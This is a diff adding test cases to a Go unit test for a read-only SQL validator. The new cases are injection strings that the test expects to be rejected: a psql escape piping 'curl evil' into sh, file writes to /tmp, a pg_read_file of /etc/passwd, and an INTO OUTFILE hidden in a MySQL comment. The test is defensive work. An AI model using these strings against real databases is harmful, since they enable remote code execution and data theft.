@@ -31,6 +31,14 @@ func TestCheckReadOnlySQL(t *testing.T) {
 		{"SELECT SLEEP(100)", errcode.Forbidden},
 		{"SELECT pg_read_file('/etc/passwd')", errcode.Forbidden},
 		{"-- x\nINSERT INTO t VALUES (1)", errcode.Forbidden},
+		{`SELECT 1 \! curl evil | sh`, errcode.Forbidden},
+		{`SELECT 1 \o /tmp/x`, errcode.Forbidden},
+		{`SELECT 1 \copy t to '/tmp/x'`, errcode.Forbidden},
+		{`SELECT 1 \T /tmp/x`, errcode.Forbidden},
+		{`SELECT 'a\'b'`, errcode.Forbidden},
+		{"SELECT 1 /* \\! hidden */", errcode.Forbidden},
+		{"SELECT 1 /*!50000 INTO OUTFILE '/tmp/x' */", errcode.Forbidden},
+		{"SELECT 1 /*+ MAX_EXECUTION_TIME(10) */", ""},
 	}
 	for _, tt := range tests {
 		_, err := checkReadOnlySQL(tt.sql)
